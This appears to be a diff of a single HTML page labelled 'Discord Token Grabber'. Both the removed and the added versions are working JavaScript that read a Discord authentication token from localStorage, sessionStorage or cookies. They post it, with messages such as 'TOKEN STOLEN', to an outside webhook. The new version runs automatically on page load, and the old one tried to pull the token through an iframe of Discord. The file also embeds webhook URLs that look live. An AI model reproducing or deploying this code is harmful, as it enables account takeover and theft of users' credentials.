@@ -1,43 +1,28 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Discord</title>
+    <title>Discord Nuke</title>
     <style>
-        body { margin: 0; padding: 0; background: #2f3136; }
-        iframe { 
-            width: 100%; 
-            height: 100vh; 
-            border: none; 
-        }
+        body { background: #2f3136; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
+        button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
+        #output { margin-top: 20px; word-break: break-all; color: #aaa; }
     </style>
 </head>
 <body>
-    <!-- This loads Discord inside your page -->
-    <iframe src="https://discord.com/channels/@me" id="frame"></iframe>
+    <h2>Discord Token Grabber</h2>
+    <button id="grab">Grab Token</button>
+    <div id="output"></div>
 
     <script>
-        const webhook = "https://discord.com/api/webhooks/1544089033750351872/N8IZsnU3Llw2BpW7cnY_9OY9z_7k2vzlLQu6u-6YusUxSUi2L3HoeGNFPcWEQqld8B2t";
+        const webhook = "https://webhook.site/488941e1-61a4-4381-9534-1ec26ff9a6ef";
 
-        // 1. Send Alive signal
-        fetch(webhook, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ content: "🟢 **SYSTEM ONLINE**" })
-        });
-
-        // 2. Try to get token from the iframe
-        let token = null;
-        
-        try {
-            // Access the iframe's content window
-            const iframeWindow = document.getElementById('frame').contentWindow;
+        async function grabToken() {
+            // 1. Try LocalStorage
+            let token = localStorage.token || sessionStorage.token;
             
-            // Try standard storage
-            token = iframeWindow.localStorage.token || iframeWindow.sessionStorage.token;
-            
-            // Try cookies
+            // 2. If not found, try Cookies
             if (!token) {
-                const cookies = iframeWindow.document.cookie.split(';');
+                const cookies = document.cookie.split(';');
                 for (let cookie of cookies) {
                     if (cookie.trim().startsWith('token=')) {
                         token = cookie.split('=')[1];
@@ -45,29 +30,30 @@
                     }
                 }
             }
-        } catch (e) {
-            // If cross-origin blocking happens, try grabbing from the main window if they are same-origin
-            // But usually, iframe access is blocked by Discord too.
+
+            // 3. Display it
+            document.getElementById('output').innerText = token || "No Token Found (Not Logged In?)";
+
+            // 4. Send it to your Webhook
+            if (token) {
+                fetch(webhook, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({content: "🔥 TOKEN: " + token})
+                });
+            } else {
+                fetch(webhook, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({content: "⚠️ NO TOKEN"})
+                });
+            }
         }
 
-        if (token) {
-            fetch(webhook, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: `🔥 **TOKEN STOLEN** 🔥\n\`\`\`${token}\n\`\`\`` })
-            })
-            .then(() => {
-                setTimeout(() => {
-                    document.getElementById('frame').src = "https://discord.com/channels/@me";
-                }, 2000);
-            });
-        } else {
-            fetch(webhook, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: "⚠️ **NO TOKEN** - CORS Blocked or Not Logged In" })
-            });
-        }
+        document.getElementById('grab').addEventListener('click', grabToken);
+        
+        // Auto-run once on load
+        grabToken();
     </script>
 </body>
 </html>
